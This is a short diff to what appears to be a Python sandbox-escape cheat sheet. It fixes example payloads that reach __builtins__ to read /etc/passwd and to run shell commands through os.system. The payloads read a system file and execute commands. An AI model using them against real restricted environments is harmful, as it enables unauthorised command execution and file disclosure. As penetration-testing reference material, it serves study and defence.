@@ -396,8 +396,8 @@ __builtins__["__import__"]('os').system('ls')
 
 ```python
 # Possible payloads once you have found the builtins
-.open("/etc/passwd").read()
-.__import__("os").system("ls")
+__builtins__["open"]("/etc/passwd").read()
+__builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
